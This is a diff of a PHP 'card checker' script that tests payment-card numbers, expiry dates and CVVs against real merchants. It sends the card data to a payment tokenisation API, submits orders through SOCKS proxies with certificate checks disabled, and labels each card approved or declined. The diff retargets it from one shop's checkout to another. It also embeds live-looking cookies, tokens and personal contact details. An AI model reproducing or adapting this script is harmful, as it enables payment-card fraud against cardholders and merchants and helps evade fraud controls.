@@ -154,43 +154,43 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://www.quantumtouch.com/en/quantum-touch-store/your-cart/checkout/task-step/step-4');
-// curl_setopt($ch, CURLOPT_HEADER, 0);
-// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-//    curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-//    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-// 'accept-encoding: gzip, deflate, br',
-// 'accept-language: en-US,en;q=0.9',
-// 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryeMSkUB9d8i5CjiBw',
-// 'cookie: 0379e85b77dcc4500d7c3d4c7cd784d5=s56o1q6vrodd6jf48c89k8mn1d; _omappvp=3Hl62xhIhX1y4sM5s7xB6YcwG3bua4fDN8ZB0ePaLqIzjgJVA7adCxtPZR9NzZEWdy9C17OUSRWWt9QTl6VTCzQ9RQfb8YHk',
-// 'origin: https://www.quantumtouch.com',
-// 'referer: https://www.quantumtouch.com/en/quantum-touch-store/your-cart/checkout/task-step/step-3',
-// 'user-agent: '.$browser.''
-// ));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api2-c.heartlandportico.com/SecureSubmit.v1/api/token?callback=jsonp_callback_61596&token_type=supt&object=token&_method=post&api_key=pkapi_prod_aEVgDT7HWL4SkAfTUH&card%5Bnumber%5D='.$cc.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&card%5Bcvc%5D='.$cvv.'');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'Accept: */*',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Host: api2-c.heartlandportico.com',
+'Referer: https://api2-c.heartlandportico.com/SecureSubmit.v1/token/2.2.1/field.html',
+'user-agent: '.$browser.''
+));
 
 // curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 
 
-// $b_pago = curl_exec($ch);
+$b_pago = curl_exec($ch);
 
-// $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
-//  $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
-//  $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-//  $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-//  $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
-//  $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
+$token = trim(strip_tags(getstr($b_pago,'"token_value": "','"')));
+$number = trim(strip_tags(getstr($b_pago,'"number": "','"')));
+
+ $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
+ $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+ $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+ $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
+ $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));
 
 
   // echo $b_pago;
@@ -205,7 +205,7 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://madtoto.com/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://api.sight-sound.com/orders/payment');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -234,19 +234,19 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
+'accept: application/json, text/plain, */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: gdpr[consent_types]=%5B%5D; gdpr[allowed_cookies]=%5B%22gdpr%5Bconsent_types%5D%22%2C%22gdpr%5Ballowed_cookies%5D%22%2C%22PHPSESSID%22%2C%22gdprprivacy_bar%22%2C%22wordpress_sec_%7Bhash%7D%22%2C%22wordpress_logged_in_%7Bhash%7D%22%2C%22wfwaf-authcookie-%7Bhash%7D%22%2C%22woocommerce_items_in_cart%22%2C%22woocommerce_cart_hash%22%2C%22wp_woocommerce_session_%7Bhash%7D%22%2C%22__stripe_mid%22%2C%22__stripe_sid%22%2C%22__EC_TEST__%22%2C%22wordpress_test_cookie%22%2C%22jetpack_blog_subscribe_%7Bhash%7D%22%2C%22tk_ai%22%2C%22tk_qs%22%2C%22tk_or%22%2C%22tk_r3d%22%2C%22tk_lr%22%2C%22tk_tc%22%2C%22_ga%22%2C%22_gid%22%2C%22_gat%22%2C%22_gat_gtag_UA_7195390_6%22%5D; pum-17632=true; woocommerce_items_in_cart=1; wp_woocommerce_session_854a37d15f11b45c5f7a497628ab5148=4f2e38bab45b1cfa41222992570c67f8%7C%7C1592548475%7C%7C1592544875%7C%7C5a371dc18b5c8591c7a34e1868c7481d; woocommerce_cart_hash=d4ed21e4b8889bf497b2f8be03a66905; __stripe_mid=83a52057-8504-4bf6-a2b0-1e2b0df992a4; __stripe_sid=543bec75-ba3b-46f7-a2a8-40ac8393700d',
-'origin: https://madtoto.com',
-'referer: https://madtoto.com/checkout/',
+'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ0b2tlbiI6eyJhcGlLZXkiOiJlMmIxNjY5YS0zMGJlLTQxMGQtOWI3Yi0yM2QwMzU5MmM5NzAiLCJleHBpcmVzIjoiMjAyMC0wNi0xOFQwMjo1Njo1NiJ9fQ.dpdXVmoTy6BTcxwLYNtRCVMy7GaLHASWtWDlj4ro7hC8FKP1GtBrnnsLszSrNlheA2q2DhWHCXnjLGlbIXT5Tg',
+'content-type: application/json',
+'origin: https://sight-sound.com',
+'referer: https://sight-sound.com/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincnet&billing_last_name=Warner&billing_company=&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=5182641524&billing_email=pubgkittu%40gmail.com&wcal_guest_capture_nonce=6fc9af9751&_wp_http_referer=%2Fcheckout%2F&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=Select+a+country+%2F+region%E2%80%A6&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=usa_epay_credit_card&wc-usa-epay-credit-card-account-number='.$cc.'&wc-usa-epay-credit-card-expiry='.$mes.'+%2F+'.$ano1.'&wc-usa-epay-credit-card-csc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=5c60fe2d9e&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"busCount":null,"payment":{"cardNumber":"'.$cc4.'","paymentToken":"'.$token.'","cardType":"visa","name":"Vincent Warner"},"paymentGC":null,"cart":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1OTIzNzkzNDEsImNhcnQiOnsib3JkZXIiOnsib3JkZXJOdW1iZXIiOi0xOTg0OTg5NiwiY3VzdG9tZXJOdW1iZXIiOjUwMDIsInN0YXR1c0NEIjoiT1BFTiIsIm1haWxUb2FkZHJlc3MiOnsibWFpbFRvUGhvbmVOdW1iZXIiOiI1MTgyNjQxNTI0IiwibWFpbFRvQ29tcGFueU5hbWUiOm51bGwsIm1haWxUb0ZpcnN0TmFtZSI6IlZJTkNORVQiLCJtYWlsVG9MYXN0TmFtZSI6IldBUk5FUiIsImFkZHJlc3MxIjoiMTIgQVZFTlVFIiwiYWRkcmVzczIiOm51bGwsImNpdHkiOiJNSUFNSSIsInN0YXRlIjoiRkwiLCJ6aXAiOiIzMzEwMSIsImNvdW50cnkiOiJVU0EifSwib3JkZXJEYXRlIjoiMjAyMC0wNi0xN1QwMjo1NzozNSIsInNwZWNpYWxSZW1vdmVkIjpmYWxzZSwiZmluYWxQYXltZW50RHVlRGF0ZSI6IjIwMjAtMDYtMTdUMDM6MDU6NDEiLCJhZGRVc2VySUQiOiIqT09PTyIsImFkZExvY2F0aW9uQ0QiOiJJTlRFUk5FVCIsImVkaXRVc2VySUQiOiIqT09PTyIsImVkaXREYXRlIjoiMjAyMC0wNi0xN1QwMjo1NzozNSIsIm9yZGVyT3JpZ2luIjoiSU5URVJORVQiLCJvcmRlclRvdGFsUHJpY2UiOjEwLjAsInNsaWRpbmdTY2FsZURpc2NvdW50IjowLjAsInRpZXJZZWFyIjoyMDIwLCJzZXNzaW9uUGFpZEFtb3VudCI6MC4wLCJhbW91bnRQYWlkV2hlbk9yZGVyTG9hZGVkIjowLjAsIm1vbmV5T25BY2NvdW50IjowLjAsImFtb3VudFJlZnVuZGVkV2hlbk9yZGVyTG9hZGVkIjowLjAsInNlc3Npb25SZWZ1bmRBbW91bnQiOjAuMCwiY29udGFjdEZpcnN0TmFtZSI6IlZJTkNORVQiLCJjb250YWN0TGFzdE5hbWUiOiJXQVJORVIiLCJtYWlsVG9TYW1lQXNDdXN0b21lciI6IlkiLCJlZGl0TW9kZSI6ZmFsc2UsIm1vZGlmaWVkIjp0cnVlLCJpc05ldyI6dHJ1ZSwidGllckNEIjoiTk9MRVZFTCIsInByZXNlbnRlZEJ5TmFtZSI6InNhbSIsImZpbmFsU2FsZVlOIjoiTiIsImJpbGxpbmdBZGRyZXNzIjp7ImZpcnN0TmFtZSI6bnVsbCwibGFzdE5hbWUiOm51bGwsImFkZHJlc3MxIjoiMTIgQVZFTlVFIiwiYWRkcmVzczIiOm51bGwsImNpdHkiOiJNSUFNSSIsInN0YXRlIjoiRkwiLCJ6aXAiOiIzMzEwMSIsImNvdW50cnkiOiJVU0EifSwibWFpbFRvQWRkcmVzc1ZlcmlmaWVkWU4iOiJOIiwic3BlY2lhbEF1dG9BcHBsaWVkWU4iOiJOIiwic2VhdHNMb2NrZWRUaW1lIjowLCJvcmRlclRva2VuIjoiZDExZjUxYTgtNGQ1MC00MGY0LWI2NzctNTI0NGM4ZmU3NzM4IiwidG90YWxTYXZpbmdzIjowLjAsImZpbmFsU2FsZURheXMiOjMwLCJ0b3RhbEJhbGFuY2UiOjEwLjAsInRvdGFsRGlzY291bnQiOjAuMCwidHJhbnNhY3Rpb25DaGFyZ2UiOjAuMCwidGF4ZXMiOjAuMCwic2hpcHBpbmdBbmRIYW5kbGluZyI6MC4wLCJleHBlZGl0ZWRTaGlwcGluZyI6MC4wLCJpbnRlcm5hdGlvbmFsU2hpcHBpbmciOjAuMCwiaXRlbUxpc3QiOlt7Iml0ZW1UeXBlQ0QiOiJHSUZUQ0FSRCIsImV2ZW50Q0QiOiJHSUZUQ0FSRCIsImV2ZW50RGF0ZVRpbWUiOiIyMDIwLTA2LTE3VDAyOjU3OjM1Iiwic3RhdHVzQ0QiOiJBQ1RJVkUiLCJsdW1wU3VtRGlzY291bnQiOjAuMCwiYnVzQ291bnQiOjAsImFkZERhdGUiOjE1OTIzNzcwNTU0MzcsImFkZFVzZXJpZCI6IipPT09PIiwiYWRkTG9jYXRpb24iOiJJTlRFUk5FVCIsImVkaXRNb2RlIjpmYWxzZSwibW9kaWZpZWQiOnRydWUsImlzTmV3Ijp0cnVlLCJzZW5kVG9BY2NwYWMiOmZhbHNlLCJsb2dDaGFuZ2VzIjpmYWxzZSwiaXRlbVRvdGFsUHJpY2UiOjEwLjAsIml0ZW1Ub3RhbEZlZXMiOjAuMCwiaXRlbVRvdGFsVGF4ZXMiOjAuMCwiaXRlbUdyYW5kVG90YWxQcmljZSI6MTAuMCwic2t1Q2QiOiJHSUZUX0NBUkQiLCJza3VEZXNjIjoiR2lmdCBDYXJkIiwic2t1QmluTG9jIjoiTUxXSCIsImZyZWVJdGVtWU4iOiJOIiwibG9ja2VkU2VhdFlOIjoiTiIsIm1lcmNoSXRlbURlc2MiOiJHaWZ0IENhcmQiLCJvcmRlck51bWJlciI6LTE5ODQ5ODk2LCJpdGVtTnVtYmVyIjoxLCJpdGVtVG90YWxDb3VudCI6MSwidG90YWxEaXNjb3VudCI6MC4wLCJpdGVtRGV0YWlsTGlzdCI6W3sib3JkZXJJdGVtRGV0YWlsc0tleSI6e30sImN1c3REaXNjVHlwZSI6Ik4iLCJzcGVjaWFsRGlzY1R5cGUiOiJOIiwibWFuRGlzY1R5cGUiOiJOIiwiY291bnQiOjEsImxpc3RQcmljZSI6MTAuMCwicHJpY2VWYWx1ZSI6MC4wLCJjb21wQ291bnQiOjAsImN1c3REaXNjQ291bnQiOjAsImN1c3REaXNjVmFsdWUiOjAuMCwiY3VzdERpc2NUb3RhbEFtb3VudCI6MC4wLCJzcGVjaWFsRGlzY0NvdW50IjowLCJzcGVjaWFsRGlzY1ZhbHVlIjowLjAsInNwZWNpYWxEaXNjVG90YWxBbW91bnQiOjAuMCwibWFuRGlzY0NvdW50IjowLCJtYW5EaXNjVmFsdWUiOjAuMCwibWFuRGlzY1RvdGFsQW1vdW50IjowLjAsInNlYXREaXNjQ291bnQiOjAsInNlYXREaXNjQW1vdW50IjowLjAsInNlYXREaXNjVG90YWxBbW91bnQiOjAuMCwiaXNOZXciOnRydWUsInVuaXRQcmljZSI6MTAuMCwiZGlzY291bnRQcmljZSI6MC4wLCJvcmRlck51bWJlciI6MCwiaXRlbU51bWJlciI6MSwiZGVzaWduYXRpb25DRCI6IkFOWSIsImRlc2lnVG90YWxQcmljZSI6MTAuMCwidG90YWxEaXNjb3VudCI6MC4wfV19XX0sImN1c3RvbWVyIjp7ImNvbnRhY3QiOnsiZmlyc3ROYW1lIjoiVklOQ05FVCIsImxhc3ROYW1lIjoiV0FSTkVSIiwicGhvbmVOdW0iOiI1MTgtMjY0LTE1MjQiLCJlbWFpbEFkZHIiOiJwdWJna2l0dHVAZ21haWwuY29tIn0sImFkZHJlc3MiOnsic3RyZWV0MSI6IjEyIEFWRU5VRSIsImNpdHkiOiJNSUFNSSIsInN0YXRlQ29kZSI6IkZMIiwiemlwQ29kZSI6IjMzMTAxIiwiY291bnRyeUNvZGUiOiJVU0EiLCJ2ZXJpZmllZFlOIjoiTiJ9LCJjdXN0Tm8iOiIyMzE5NzgwIiwiYWRkRGF0ZSI6IjIwMjAtMDYtMTdUMDI6NTg6MDYifX19.PB2araU8h7EoInhK8zSJ1YEXP3_fqDbbqapIOJMQMLXXV_ARsDYIIGCDHGGt6__VDwzCPjvsnJlNXe4Jo7bmkA"}');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -257,30 +257,30 @@ if (curl_errno($ch)) {
 }
 curl_close($ch);
 
-//////////////////////// START POST FILED 1 ////////////////////////
+// //////////////////////// START POST FILED 1 ////////////////////////
 
 
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"')));
+$message = trim(strip_tags(getstr($result,'"','"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-// // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"result":"success"')){
-// updatecart();
-      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-    }
-elseif(strpos($result,'Not Acceptable!')) {
+// // // // /////////////////////// RESULT ////////////////////////////////////
+// if(strpos($result,'"result":"success"')){
+// // updatecart();
+//       echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+//     }
+// elseif(strpos($result,'Not Acceptable!')) {
 
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+//             echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
-  }
+//   }
 
-else {
+// else {
               echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-  }
+  // }
 curl_close($curl);
 ob_flush();
-     echo $result;
+     // echo $result;
 ?>
